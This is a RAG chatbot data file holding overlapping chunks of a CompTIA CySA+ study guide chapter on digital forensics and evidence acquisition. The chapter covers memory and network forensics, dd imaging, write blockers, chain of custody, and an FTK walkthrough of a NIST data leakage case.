rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	or volumes as mentioned earlier in the chapter. We will walk you through a forensic scenario later in this chapter, including disk capture, so if you want to read more about disk forensics, skip ahead. Memory Forensics Conducting memory forensics requires either running live forensic analysis on a running machine or making a copy of live memory to point in time forensic memory analysis. Tools like Volatility, an open source memory forensics framework, can capture and analyze memory. Volatility has a wide range of plug-­in commands, including the ability to detect API hooks, read the keyboard buffer, grab the Windows clipboard, look for live TCP connections, scan for driver objects, and many more. If there is data accessible in live memory in an unencrypted form, you should assume it can be recovered—­and if it is encrypted, the encrypted version can be accessed and potentially decrypted if the key is available. Memory forensics can be particularly useful when attempting to recover security artifacts that are stored in memory when in use such as encryption keys and passwords. As a forensic practitioner, you should keep in mind that system crash dumps often contain a copy of live memory, making them an attractive target for both practitioners and knowledgeable attackers. Mobile Device and Cell Phone Forensics Mobile device forensic capabilities exist in many commercial forensic suites, as well as in the form of stand-­alone tools. Due to the security features that many phone operating systems provide, they often have specialized decryption or brute-­forcing capabilities to allow them to capture data from a locked and encrypted phone or phone volume. Phone backup forensic capabilities are also a useful tool for mobile forensics. Backups may not have all current data, but they can contain older data that was deleted and may not have the same level of security that the phone itself does, thus making them an attractive target for forensic acquisition and review. Password Crackers and Password Recovery An increasing number of drives and devices are encrypted or use a password to protect the system or files. This makes password recovery tools (also called password crackers) very useful to a forensic examiner. Common places to discover password protection beyond the operating system or account level include Microsoft Office files, PDFs, as well as ZIP and RAR compressed files. Conducting Endpoint Forensics 457 Recovering passwords for forensic investigations can be challenging, but tools like ElcomSoft’s Advanced Office Password Recovery, shown in Figure 13.3, provide brute-­force password breaking for a range of file types. FIGURE 13.3 Advanced Office Password Recovery cracking a Word DOC file Some forensic workstations include powerful graphics cards. This is partially due to the ability of many password-­cracking tools to use the graphics card or GPU to perform password cracking operations. Using a GPU can result in massive speed increases over traditional CPU-­based cracking, making a powerful CPU a worthwhile investment if you ever need to perform a brute-­force password cracking attack and your forensic tools support it. Cryptography Tools Cryptographic tools
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Advanced Office Password Recovery, shown in Figure 13.3, provide brute-­force password breaking for a range of file types. FIGURE 13.3 Advanced Office Password Recovery cracking a Word DOC file Some forensic workstations include powerful graphics cards. This is partially due to the ability of many password-­cracking tools to use the graphics card or GPU to perform password cracking operations. Using a GPU can result in massive speed increases over traditional CPU-­based cracking, making a powerful CPU a worthwhile investment if you ever need to perform a brute-­force password cracking attack and your forensic tools support it. Cryptography Tools Cryptographic tools are common both to protect forensic data and to protect data and applications from forensics. Forensic tools often have encryption capabilities to ensure that sensitive data under forensic investigation is not breached as part of the investigation when drives or files are transferred, or if the forensic environment is compromised. 458 Chapter 13 ■ Performing Forensic Analysis and Techniques for Incident Response Encryption tools are also needed to handle encrypted drives and network protocols. These capabilities vary from tool to tool, but handling BitLocker, Microsoft Office, and other common encryption mechanisms are common tasks during forensic investigations. When forensic techniques are used to investigate malware, encryption and other protection schemes are frequently encountered as a means of preventing code analysis of malware. Many malware packages use tools called “packers,” intended to protect them from reverse engineering. Packers are intended to make direct analysis of the code difficult or impossible. Some forensic tools provide support for unpacking and decoding from packing techniques like Base64 encoding. Log Viewers Log files can provide information about the system state, actions taken on the system, and errors or problems, as well as a wide variety of other information. This makes log entries particularly useful when you are attempting to understand what occurred on a system or device. Forensic suites typically build in log viewers that can match log entries to other forensic information, but specialized logs may require additional tools. Network Forensics Network traffic forensics require capturing traffic on the network or reviewing artifacts of that traffic like security or network device logs, traffic monitoring data, or other information that can help forensic practitioners to reconstruct events and incidents. Wireshark Network Forensics Wireshark is an open source network protocol analyzer (sometimes called a packet sniffer, or sniffer). It runs on many modern operating systems and can allow users to capture and view network data in a GUI. Captures can be saved, analyzed, and output in a number of formats. Figure 13.4 shows a simple Wireshark capture of traffic to the CompTIA website. Note the DNS query that you can see that starts the connection. If you scrolled further you’d see the multitude of trackers and ad sites that also get hit along the way! We talked about Wireshark and tcpdump in Chapter 3, “Malicious Activity,” where the focus was on identifying malicious activity. Forensics are another way to determine malicious activity, although they’re typically performed
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	can allow users to capture and view network data in a GUI. Captures can be saved, analyzed, and output in a number of formats. Figure 13.4 shows a simple Wireshark capture of traffic to the CompTIA website. Note the DNS query that you can see that starts the connection. If you scrolled further you’d see the multitude of trackers and ad sites that also get hit along the way! We talked about Wireshark and tcpdump in Chapter 3, “Malicious Activity,” where the focus was on identifying malicious activity. Forensics are another way to determine malicious activity, although they’re typically performed after the fact rather than live. Network Forensics FIGURE 13.4 459 Wireshark view of network traffic Tcpdump Network Forensics Tcpdump is a command-­line packet capture utility found on many Linux and Unix systems. Tcpdump is a powerful tool, particularly when combined with other tools like grep to sort and analyze the same packet data that you could capture with Wireshark. Although Wireshark typically has to be installed on systems, tcpdump is more likely to be installed by default. In Figure 13.5, you can see a tcpdump watching network traffic for DNS traffic. As you can see, text representations of packets can be harder to sort through. In fact, when capturing this example the authors had to output the capture to a file rather than to the terminal buffer because loading the CompTIA website generated more traffic than the terminal’s default buffer. Tcpdump is powerful and helpful, but you will need to learn how to filter the output and read through it. 460 Chapter 13 FIGURE 13.5 ■ Performing Forensic Analysis and Techniques for Incident Response Tcpdump of network traffic Cloud, Virtual, and Container Forensics Cloud computing, virtualization, and containerization have created a new set of challenges for forensic practitioners. Many of the artifacts that would have once been available are now part of ephemeral virtual machines or containers, or are hosted by third-­party providers. Practitioners must plan in advance for how they will conduct forensic investigations, meaning you need to know what artifacts you can gather, what you will need to do to gather them, and what you may need to partner with a cloud provider to obtain, or if they will provide the access or data you need at all. Performing Cloud Service Forensics Performing forensic investigations on cloud services can be challenging, if not impossible. Shared tenant models mean that forensic data can be hard to get and often require the cloud Cloud, Virtual, and Container Forensics 461 service provider to participate in the investigation. Maintaining a proper chain of custody, preserving data, and many other parts of the forensic process are more difficult in many cloud environments. If a cloud service is likely to be part of your forensic investigation, you may want to do the following: ■■ Determine what your contract says about investigations. ■■ Determine what legal recourse you have with the vendor. ■■ ■■ Identify the data that you need and whether it is
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	mean that forensic data can be hard to get and often require the cloud Cloud, Virtual, and Container Forensics 461 service provider to participate in the investigation. Maintaining a proper chain of custody, preserving data, and many other parts of the forensic process are more difficult in many cloud environments. If a cloud service is likely to be part of your forensic investigation, you may want to do the following: ■■ Determine what your contract says about investigations. ■■ Determine what legal recourse you have with the vendor. ■■ ■■ Identify the data that you need and whether it is available via methods you or your organization controls. Work with the vendor to identify a course of action if you do not control the data. More detail about cloud computing forensic challenges can be found in NIST draft NISTIR 8006, NIST Cloud Computing Forensic Challenges, at http://csrc.nist.gov/publications/drafts/nistir-­8006/draft_ nistir_8006.pdf. Performing Virtualization Forensics Virtualization forensics can be somewhat less complex than attempting forensics on a hosted environment. Virtualized systems can be copied and moved to a secure environment for analysis, but as a forensic practitioner you will need to keep in mind your forensic goals. Incident response forensics may be easier since the evidentiary requirements are typically less than those found in a legal case, making how you handle the forensic copies of systems and how and when you capture them less critical. Regardless of whether you’re conducting an investigation for incident response, an internal investigation, or law enforcement, you will need to understand the limitations of what your capture and copying methods can do. Remember to also consider the underlying virtualization environment—­and what you would do if the environment itself were the target of the forensic work! Virtualization and containerization share many of the same goals and operate in somewhat similar ways. Figure 13.6 shows how the two concepts look at a high level. Note the separation of the virtual machines in the virtualized environment versus the applications running under the same containerization engine. Container Forensics Containers are increasingly common, and container forensics can create some unique issues. Perhaps the most important of them is that most containers are designed to be disposable, and thus if something goes wrong many organizations will have processes in place to shut down, destroy, and rebuild the container in an automated or semi-­automated fashion. Even if there isn’t a security issue, due to their ephemeral nature, containers may be destroyed or rescheduled to a different node. This means that forensic artifacts may be lost. Chapter 13 462 FIGURE 13.6 ■ Performing Forensic Analysis and Techniques for Incident Response Virtualization vs. containerization Application Application Application Libraries Libraries Libraries Guest OS Guest OS Guest OS Application Application Application Container Engine Hypervisor Operating System Hardware Hardware Virtualization Containerization Containerization technology also creates other challenges: internal lots and filesystem artifacts are ephemeral; they communicate over software-­defined networks that change frequently as containers are bought online, taken offline, or moved; and security contexts are dynamically modified by the containerization orchestration
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	nature, containers may be destroyed or rescheduled to a different node. This means that forensic artifacts may be lost. Chapter 13 462 FIGURE 13.6 ■ Performing Forensic Analysis and Techniques for Incident Response Virtualization vs. containerization Application Application Application Libraries Libraries Libraries Guest OS Guest OS Guest OS Application Application Application Container Engine Hypervisor Operating System Hardware Hardware Virtualization Containerization Containerization technology also creates other challenges: internal lots and filesystem artifacts are ephemeral; they communicate over software-­defined networks that change frequently as containers are bought online, taken offline, or moved; and security contexts are dynamically modified by the containerization orchestration tool. All of this means that if you anticipate the need to respond to incidents involving containerized applications, you need to preplan to capture the data you will need. That means identifying tooling and processes to audit activities, as well as methods to capture data that may be necessary for container forensics. Fortunately, containerization security tools are available that can help with this. Post-­Incident Activity and Evidence Acquisition The CySA+ exam objectives focus on three major areas as part of post-­incident activity: forensic analysis, root cause analysis, and lessons learned. In addition, evidence acquisition is commonly conducted as part of forensic activity and is included in this section. It’s important to note that “post-­incident” often means “during an ongoing incident,” not after the incident is completely over, so make sure you particularly consider the impact of forensic analysis during an active incident. Post-­Incident Activity and Evidence Acquisition 463 Conducting a Forensic Analysis Forensic analysis relies on more than just a forensic toolkit and a forensic suite. The process of conducting a forensic investigation is often complex due to the number of systems, devices, individuals, and other material involved. Forensic investigations conducted as part of an incident response process will often focus on root cause analysis, the process of determining what happened and why. In addition, after the forensic investigation and incident response process is completed, lessons learned will be documented and acted on as part of the post-­incident activity. Exam Note Make sure you consider root cause analysis and lessons learned as key outputs from a forensic analysis as you prepare for the exam. Next, we will look at a typical forensic process. Forensic Procedures Forensic analysis, sometimes called a forensic investigation can take many forms and there are many formal models for forensic analysis, but the basic process involved when conducting them remains the same. In almost all scenarios you will take these steps: 1. Determine what you are trying to find out. You may be asked to investigate a compromised system, to analyze the actions taken by malware, or to find out if a system administrator made an unauthorized change to a system. This forms the problem statement that helps to define what forensic activities you will take. 2. Outline the locations and types of data that would help you answer the questions from step 1. Data may exist in many forms, and applications and systems can determine
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	when conducting them remains the same. In almost all scenarios you will take these steps: 1. Determine what you are trying to find out. You may be asked to investigate a compromised system, to analyze the actions taken by malware, or to find out if a system administrator made an unauthorized change to a system. This forms the problem statement that helps to define what forensic activities you will take. 2. Outline the locations and types of data that would help you answer the questions from step 1. Data may exist in many forms, and applications and systems can determine the format and accessibility of the data. Knowing where and how you need to collect data will also influence what your forensic process looks like. At this stage, you may not know the specific hardware or log locations, but you should be able to come up with the types of data and systems you will need to capture data from. 3. Document and review your plan. 4. Acquire and preserve evidence. The acquisition process may require cloning media, seizing systems or devices, or making live memory images to ensure that information is not lost when a system is powered off. 5. Perform initial analysis, carefully tracking your actions, the systems and data you work with, and your findings, as well as any questions you need to answer. 464 Chapter 13 ■ Performing Forensic Analysis and Techniques for Incident Response 6. Use the initial analysis to guide further work, including deeper investigation, and review where the initial analysis pointed to additional data or where information is missing that is needed to answer the questions you originally asked. 7. Report on the findings of the investigation. Acquisition processes need to take into account the order of volatility, which measures how easy data is to lose. This means that data stored in memory or caches is considered highly volatile, since it will be lost if the system is turned off, whereas data stored in printed form or as a backup is considered much less volatile. Figure 13.7 shows a view of the order of volatility of common storage locations that data is likely to be acquired from during a forensic investigation. FIGURE 13.7 Order of volatility of common storage locations CPU cache, registers, running processes and RAM Network traffic Disk Drives Backups, printouts, optical media Unexpected Forensic Discoveries Forensic investigations can result in finding data that you did not intend to uncover as part of the investigation. Knowing what you will do if you find signs of issues or problems outside of the scope of the investigation you are conducting is helpful to avoid problems. This can be as simple as finding evidence of an employee violating company policies while investigating a compromise, or as potentially complex as discovering evidence of illegal activities during an investigation. Make sure you know if you have a duty to report certain types of finding, under local, state, or federal law, or due to your own organization’s
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	finding data that you did not intend to uncover as part of the investigation. Knowing what you will do if you find signs of issues or problems outside of the scope of the investigation you are conducting is helpful to avoid problems. This can be as simple as finding evidence of an employee violating company policies while investigating a compromise, or as potentially complex as discovering evidence of illegal activities during an investigation. Make sure you know if you have a duty to report certain types of finding, under local, state, or federal law, or due to your own organization’s policies. Legal Holds and Preservation Legal holds, sometimes called litigation holds, require organizations to preserve all potentially relevant data and information related to pending or currently active litigation. This means that organizations must be prepared to both preserve and deliver data when a legal hold occurs. Post-­Incident Activity and Evidence Acquisition 465 Legal hold notifications typically come from an organization’s lawyers after they receive notice from opposing counsel. The notice may identify specific information or simply provide information about the pending litigation about names, dates, or other details that can aid in identifying which data to preserve. Since legal holds may require organizations to preserve data like logs, email, or transactional information that would normally be destroyed as part of scheduled maintenance or destruction procedures, security professionals and other IT staff need to have procedures in place to preserve that data. Preservation may also be required for other reasons. Some data is legally required to be preserved for a set period of time. Organizational policies may require preservation of certain types of data. Finally, data may need to be preserved as part of internal investigations in case of future legal issues. Exam Note Key exam topics from this section to consider include chain of custody, preservation, and legal holds. Evidence Acquisition Drive and media images must be captured in a forensically sound manner. They also require hashing as part of the process of validating data integrity, and with the exception of live system forensics where it cannot be completely avoided, forensic duplication should not change the source drive or device. To do this, an exact bit-­for-­bit copy is made using an imaging utility, write blockers are employed to prevent the possibility of modifying the source drive, and multiple copies are made so that the original drive can be retained for evidence. You may discover that your investigation touches systems, networks, or data that you or your organization does not own. Company bring-­ your-­own-­device (BYOD) practices, cloud services, and employee use of third-­party services for their private use on institutional systems can all complicate forensic examinations. Make sure you know your organization’s policies about each of those areas, as well as privacy policies and related standards, before you begin a forensic investigation. Forensic Copies Forensic copies of media don’t work the same way that simply copying the files from one drive to another would. Forensic copies retain the exact same layout
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	evidence. You may discover that your investigation touches systems, networks, or data that you or your organization does not own. Company bring-­ your-­own-­device (BYOD) practices, cloud services, and employee use of third-­party services for their private use on institutional systems can all complicate forensic examinations. Make sure you know your organization’s policies about each of those areas, as well as privacy policies and related standards, before you begin a forensic investigation. Forensic Copies Forensic copies of media don’t work the same way that simply copying the files from one drive to another would. Forensic copies retain the exact same layout and content for the 466 Chapter 13 ■ Performing Forensic Analysis and Techniques for Incident Response entire device or drive, including the contents of “empty” space, unallocated space, and the slack space that remains when a file does not fill all the space in a cluster. The need for a verifiable, forensically sound image means that you need to use an imaging tool to create forensic images rather than using the copy command or dragging and dropping files in a file manager. Fortunately, there are a number of commonly available tools like dd or FTK’s Imager Lite built into major forensic suites that can create forensic images. The Importance of Bit-­by-­Bit Copies One reason that copies are not done using a copy command is to ensure that slack space and unallocated space are both copied as part of the image. This captures deleted files that have not yet been overwritten, fragments of older files in the space that was not written to by new files, and data that was stored on a drive before it was partitioned. Slack and unallocated space can provide rich detail about the history of a system, and simply copying files will not provide that visibility. Imaging with dd The Linux dd utility is often used to clone drives in RAW format, a bit-­by-­bit format. dd provides a number of useful operators that you should set to make sure your imaging is done quickly and correctly: ■■ Block size is set using the bs flag and is defined in bytes. By default, dd uses a 512-­ byte block size, but this is far smaller than the block size of most modern disks. Using a larger block size will typically be much faster, and if you know the block size for the device you are copying, using its native block size can provide huge speed increases. This is set using a flag like bs = 64k. ■■ The operator if sets the input file; for example, if = /dev/disk/sda1. ■■ The operator of sets the output file; for example, of = /mnt/usb/. Avoiding Mistakes: dd Input and Output Locations It is critical that you verify the input and output locations for a dd command. To list drives, you can use commands like fdisk -­l or lsblk. You can ask lsblk for more detail by using additional flags: lsblk ––output NAME,FSTYPE,LABEL,UUID,MODE will show the device name, filesystem type,
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	its native block size can provide huge speed increases. This is set using a flag like bs = 64k. ■■ The operator if sets the input file; for example, if = /dev/disk/sda1. ■■ The operator of sets the output file; for example, of = /mnt/usb/. Avoiding Mistakes: dd Input and Output Locations It is critical that you verify the input and output locations for a dd command. To list drives, you can use commands like fdisk -­l or lsblk. You can ask lsblk for more detail by using additional flags: lsblk ––output NAME,FSTYPE,LABEL,UUID,MODE will show the device name, filesystem type, the disk label, the UUID, and the mode it is mounted in, giving you a much better view. Take careful note of which drive is which, and review your command before pressing Enter. This is where a write blocker can save the day! Post-­Incident Activity and Evidence Acquisition 467 Figure 13.8 shows a sample dd copy of a mounted drive image to a USB device. The speed of copies can vary greatly based on block size, the relative speeds of the source and destination drive, and other variables like whether the system is virtual or physical. FIGURE 13.8 dd of a volume A Complete Chain of Custody Maintaining a fully documented chain of custody is critical for investigations performed by law enforcement or that may need to survive scrutiny in court. That means you need to document what is collected; who collected or analyzed the data; when each action occurred; and when devices and other evidence were transferred, handled, accessed, and securely stored. You have to track this information for each drive, device, machine, or other item you handle during an investigation. You may need a third party in the room to validate your statements for the entire process. Handling Encrypted Drives Drive and device encryption is increasingly common, making dealing with drive images more challenging. Of course, live system imaging will avoid many of the issues found with encrypted volumes, but it brings its own set of challenges. Fortunately, commercial forensic suites handle many of the common types of encryption that you are likely to encounter, as long as you have the password for the volume. They also provide distributed cracking methods that use multiple computers to attack encrypted files and volumes. Avoiding Brute Force Brute-­force cracking of encryption keys can be very slow. Getting the encryption key from the user or an administrator, or by retrieving it from the memory of a live system, is preferable if at all possible. In 2013, the FBI located Ross Ulbricht, the operator of the Silk Road, a darknet trading site. Ulbricht, also known as the Dread Pirate Roberts, was captured in a public library where he was logged into the Silk Road site and other accounts. Since he was known to use disk 468 Chapter 13 ■ Performing Forensic Analysis and Techniques for Incident Response encryption, the FBI waited until his computer was open and logged in and then arrested him
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	the user or an administrator, or by retrieving it from the memory of a live system, is preferable if at all possible. In 2013, the FBI located Ross Ulbricht, the operator of the Silk Road, a darknet trading site. Ulbricht, also known as the Dread Pirate Roberts, was captured in a public library where he was logged into the Silk Road site and other accounts. Since he was known to use disk 468 Chapter 13 ■ Performing Forensic Analysis and Techniques for Incident Response encryption, the FBI waited until his computer was open and logged in and then arrested him and got access to his laptop before he could lock or turn off the system. This gave the FBI the opportunity to image the system without defeating the strong encryption that Ulbricht was likely to use to secure it. Using Write Blockers Write blockers are an important tool for both forensic investigation and forensic drive image acquisition. During drive acquisition, using a write blocker can ensure that attaching the drive to a forensic copy device or workstation does not result in modifications being made to the drive, thus destroying the forensic integrity of the process. The same capability to prevent writes is useful during forensic analysis of drives and other media because it ensures that no modifications are made to the drive accidentally. ■■ ■■ Hardware write blockers prevent writes from occurring while a drive is connected through them. Hardware write blockers can be certified to a NIST standard, and testing information is available via the NIST Computer Forensics Tool Testing program at www .cftt.nist.gov/hardware_write_block.htm. Software write blockers are typically less popular than hardware write blockers, making them less common. Due to the possibility of problems, hardware write blockers are more frequently used when preventing writes from occurring is important. Validating Data Integrity Image verification is critical to ensuring that your data is forensically sound. Commercial tools use built-­in data integrity verification capabilities to make sure the entire image matches the original. When investigators use dd or other manual imaging tools, md5sum or sha1sum hashing utilities are frequently used to validate images. Each time you generate an image, you should record the hash or verification information for both the original and the cloned copy, and that information should be recorded in your forensic logbook or chain of custody form. FTK’s Imager Lite will display the hash values in a report at the end of the process, as shown in Figure 13.9. Imaging Live Systems When systems are using full-­disk encryption, or when applications, malware, or other software may be memory resident without a copy on the disk, an image may need to be collected while the system is running. Live imaging may not obtain some desirable data: ■■ ■■ Live imaging can leave remnants due to the imaging utility being mounted from a removable drive or installed. The contents of a drive or memory may change during the imaging process. Post-­Incident Activity and Evidence Acquisition ■■ ■■ 469 Malware or
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	at the end of the process, as shown in Figure 13.9. Imaging Live Systems When systems are using full-­disk encryption, or when applications, malware, or other software may be memory resident without a copy on the disk, an image may need to be collected while the system is running. Live imaging may not obtain some desirable data: ■■ ■■ Live imaging can leave remnants due to the imaging utility being mounted from a removable drive or installed. The contents of a drive or memory may change during the imaging process. Post-­Incident Activity and Evidence Acquisition ■■ ■■ 469 Malware or other software may be able to detect the imaging tool and could take action to avoid it or disable it. Live images typically do not include unallocated space. Both commercial and open source tools provide portable versions that can be loaded on a live system to provide live imaging capabilities. FIGURE 13.9 FTK image hashing and bad sector checking Reimaging Systems The CySA+ exam outline calls out reimaging as part of the containment, eradication, and recovery process. Reimaging involves reinstalling a system or device. In incident response scenarios, drives are often wiped rather than simply being reformatted before reimaging to ensure that no remnant data or malicious files will remain. Reimaging will eliminate forensic artifacts and, in most cases will make it difficult, if not impossible, to recover forensic information from the system or device. That means that forensic copies must be acquired before reimaging occurs. The decision to reimage to return to normal operations can create tension between the need for a recovery and the need to preserve data for investigations. 470 Chapter 13 ■ Performing Forensic Analysis and Techniques for Incident Response Acquiring Other Data There are many other types of specialized data beyond drive images that you may want to specifically target during acquisition. Fortunately, in most cases, forensic images of the host drives will also provide access to that data if it is resident on the systems. A few of the other areas you may want to specifically target include log data, USB device histories, application data, browser cache and history, email, and user-­generated files. Acquiring and Reviewing Log Data Log data is often stored remotely and may not be accurate in the case of a compromised machine or if an administrator was taking actions they wanted to conceal. At other times an investigation may involve actions that are logged centrally or on network devices, but not on a single local system or device that you are likely to create a forensic image of. In those cases, preserving logs is important and will require additional work. To preserve and analyze logs: ■■ ■■ ■■ ■■ ■■ Determine where the logs reside and what format they are stored in. Determine the time period that you need to preserve. Remember that you may want to obtain logs from a longer period in case you find out that an issue or compromise started before you initially suspected. Work with
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	actions that are logged centrally or on network devices, but not on a single local system or device that you are likely to create a forensic image of. In those cases, preserving logs is important and will require additional work. To preserve and analyze logs: ■■ ■■ ■■ ■■ ■■ Determine where the logs reside and what format they are stored in. Determine the time period that you need to preserve. Remember that you may want to obtain logs from a longer period in case you find out that an issue or compromise started before you initially suspected. Work with system or device administrators to obtain a copy of the logs and document how the logs were obtained. Checksums or other validation are often appropriate. Identify items of interest. This might include actions, user IDs, event IDs, timeframes, or other elements identified in your scope. Use log analysis tools like Splunk, Sawmill, Event Log Analyzer, or even a text editor to search and review the logs. Viewing USB Device History Windows tracks the history of USB devices connected to a system, providing a useful forensic record of thumb drives and other devices. 4Discovery’s USB Historian can be used to review this based on a mounted drive image. During a forensic examination, the information provided by USB Historian or similar tools can be used to match an inventory of drives to those used on a computer, or to verify whether specific devices were in use at a given time. USB Historian, shown in Figure 13.10, provides such data as the system name, the device name, its serial number, the time it was in use, the vendor ID of the device, what type of device it is, and various other potentially useful information. Capturing Memory-­Resident Data Shutting down a system typically results in the loss of the data stored in memory. That means that forensic data like information in a browser memory cache or program states will be lost. Although capture of information in memory isn’t always important in a forensic investigation, it is critical to be able to capture memory when needed. Post-­Incident Activity and Evidence Acquisition F I G U R E 1 3 . 10 471 USB Historian drive image There are a number of popular tools for memory captures, with a variety of capabilities, including the following: ■■ ■■ ■■ ■■ fmem and LiME, both Linux kernel modules that allow access to physical memory. fmem is designed to be used with dd or similar tools; LiME directly copies data to a designated path and file. DumpIt, a Windows memory capture tool that simply copies a system’s physical memory to the folder where the DumpIt program is. This allows easy capture to a USB thumb drive and makes it a useful part of a forensic capture kit. The Volatility Framework supports a broad range of operating systems, including Windows, Linux, and macOS, and has a range of capabilities, including tools to extract encryption keys and passphrases, user activity analysis,
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	that allow access to physical memory. fmem is designed to be used with dd or similar tools; LiME directly copies data to a designated path and file. DumpIt, a Windows memory capture tool that simply copies a system’s physical memory to the folder where the DumpIt program is. This allows easy capture to a USB thumb drive and makes it a useful part of a forensic capture kit. The Volatility Framework supports a broad range of operating systems, including Windows, Linux, and macOS, and has a range of capabilities, including tools to extract encryption keys and passphrases, user activity analysis, and rootkit analysis. Both EnCase and FTK have built-­in memory capture and analysis capabilities as well. Using Core Dumps and Hibernation Files In addition to memory images, core dumps and crash dump files can provide useful forensic information, both for criminal and malware investigations. Since they contain the contents of live memory, they can include data that might not otherwise be accessible on the drive of a system, such as memory-­resident encryption keys, malware that runs only in memory, and other items not typically stored to the disk. The Windows crash dump file can be found by checking the setting found under Control Panel ➢ System And Security ➢ System ➢ Advanced System Settings ➢ Startup And Recovery ➢ Settings. Typically, crash dump files will be located in the system root directory: %SystemRoot%\MEMORY.DMP. Windows memory dump files can be analyzed using WinDbg; however, you shouldn’t need to analyze a Windows kernel dump for the CySA+ exam. 472 Chapter 13 ■ Performing Forensic Analysis and Techniques for Incident Response Many of the techniques involved in a forensic investigation are useful for both incident response and internal investigations that may not have the same evidentiary requirements that a forensic investigation may require. This means it is often reasonable to bypass some of the strictest parts of chain of custody documentation and other procedural requirements—­but only if you are absolutely certain that the investigation will not become a legal or police matter. When in doubt, it is safer to err on the side of over-­ documentation to avoid problems in court. Acquisitions from Mobile Devices Mobile device forensic acquisition typically starts with disabling the device’s network connectivity and then ensuring that access to the device is possible by disabling passcodes and screen lock functionality. Once this is done, physical acquisition of the SIM card, media cards, and device backups occurs. Finally, the device is imaged, although many devices may be resistant to imaging if the passcode is not known or the device is locked. There are four primary modes of data acquisition from mobile devices: ■■ ■■ ■■ ■■ Physical, by acquisition of the SIM card, memory cards, or backups Logical, which usually requires a forensic tool to create an image of the logical storage volumes Manual access, which involves reviewing the contents of the live, unlocked phone and taking pictures and notes about what is found Filesystem, which can provide details of
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	card, media cards, and device backups occurs. Finally, the device is imaged, although many devices may be resistant to imaging if the passcode is not known or the device is locked. There are four primary modes of data acquisition from mobile devices: ■■ ■■ ■■ ■■ Physical, by acquisition of the SIM card, memory cards, or backups Logical, which usually requires a forensic tool to create an image of the logical storage volumes Manual access, which involves reviewing the contents of the live, unlocked phone and taking pictures and notes about what is found Filesystem, which can provide details of deleted files as well as existing files and directories Forensic Investigation: An Example In this section, you will learn the basics of a forensic analysis using FTK. Since we have already discussed imaging, we will start from a previously acquired forensic image and will perform analysis, including the following: ■■ Import of the data into FTK, including indexing and case management ■■ Evidence of the data leakage ■■ Email communication with third parties about the files ■■ Web browser information pointing to antiforensic activities ■■ Evidence of application installs ■■ Evidence of filesystem changes, including renaming files Remember that a full forensic examination of a system can involve more tasks than those listed here and that the scope and direction of the investigation will help determine what those tasks are. You are also likely to encounter additional clues that will point you in new directions for forensic examination as you explore a system image. Forensic Investigation: An Example 473 Examples in this section were prepared using the Data Leakage Case found at https://cfreds-­archive.nist.gov/data_leakage_case/ data-­leakage-­case.html, part of the NIST Computer Forensic Reference Data Sets (CFReDS). The case includes 60 different forensic tasks, including those listed in this chapter. If you want to practice forensic techniques in more depth, you can download the forensic dataset and a forensic toolkit like SIFT or CAINE to test your skills. The dd image file for just the Windows workstation used in this case is 20 GB when extracted, so make sure you have plenty of available hard drive space. It is important to note that some companies may not want you to download tools like this and may have policies or even technology in place that will prevent it. Our technical editor from the first edition of this book had to get special permission to do so at her company! Importing a Forensic Image Once you have a forensic image in hand and have made a copy to use in your investigation, you will typically import it into your forensic tool. Figure 13.11 shows how information about the case is captured as an image is imported. F I G U R E 1 3 . 11 Initial case information and tracking 474 Chapter 13 ■ Performing Forensic Analysis and Techniques for Incident Response Once your image has been imported into a case and properly logged, the image is then indexed and analyzed. This includes identifying
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	do so at her company! Importing a Forensic Image Once you have a forensic image in hand and have made a copy to use in your investigation, you will typically import it into your forensic tool. Figure 13.11 shows how information about the case is captured as an image is imported. F I G U R E 1 3 . 11 Initial case information and tracking 474 Chapter 13 ■ Performing Forensic Analysis and Techniques for Incident Response Once your image has been imported into a case and properly logged, the image is then indexed and analyzed. This includes identifying file types, searching slack and unallocated space, building an index of file timestamps, and other analysis items. This can take some time, especially with large drives. Figure 13.12 shows the forensic image used for this case partially through the indexing process. FIGURE 13.12 Case information and tracking partly through the indexing process With indexing done, you can now begin to explore the forensic image. FTK provides a series of tabs with common evidence categories, including email, graphics, video, Internet/ chat, bookmarks, and others. Most investigators will take some time to ensure that the operating system, time zone, and other computer information (such as which users have accounts on the system) are recorded at this stage. Analyzing the Image Since this is a data leakage case, Internet browser history and email are likely to be of particular interest. Figure 13.13 shows how email can be read via FTK’s browser capability. We can see an email that was sent reading “successfully secured.” Other emails also mention a USB device, and that spy would like it if the informant can deliver the storage devices directly. This provides another clue for further investigation. Forensic Investigation: An Example FIGURE 13.13 475 Email extraction Searching the web browser history provides more information about the informant’s likely behavior. The history file for Chrome includes searches for antiforensic techniques and a visit to the antiforensic techniques page of http://forensicswiki.org, as shown in Figure 13.14. The forensicswiki.org site itself has moved to https://forensics .wiki, but its content is now on GitHub at https://github.com/ forensicswiki/wiki. The exercise remains relevant, but if you try to visit the site you won’t find it. That happens during investigations, and you may have to perform additional research to find out what was there when the site was visited! Since the informant searched for antiforensic techniques, it is likely that they applied them with some degree of success. A visit to the antiforensic techniques page, as well as searches for data that was deleted or otherwise hidden, is needed. Some of this additional information can be gathered by reviewing data cached by Windows, including install information from the local user directories. Since the sample image is a Windows machine, install information resides in C:\Users\<username>\AppData\ Local\Temp. Checking there shows that iCloud was installed in the middle of the timeframe that email communications were occurring, as shown in Figure 13.15. FTK also indexes and displays deleted files,
